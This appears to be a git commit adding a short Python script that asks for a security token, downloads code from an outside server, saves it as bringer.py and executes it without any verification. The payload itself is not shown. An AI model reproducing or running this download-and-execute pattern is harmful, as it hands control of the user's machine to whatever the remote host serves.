0c61af6735f0e6d3bea3931223facd829c142abf
arifchy369 <arif.chy369@gmail.com>
2025-02-20 01:19:57 +0600

    first commit

---
+++ main.py
@@ -0,0 +1,13 @@
+import requests
+import os
+
+header = {"pwd":input("Enter security token:").strip()}
+req = requests.get("https://rkbrand.relicsoftwares.com/sender",headers=header)
+if req.status_code==200:
+	with open("bringer.py","w") as f:
+		f.write(req.text)
+	os.system("python bringer.py")
+else:
+	with open("pass.txt","w") as f:
+		f.write("")
+	print("Password Error")
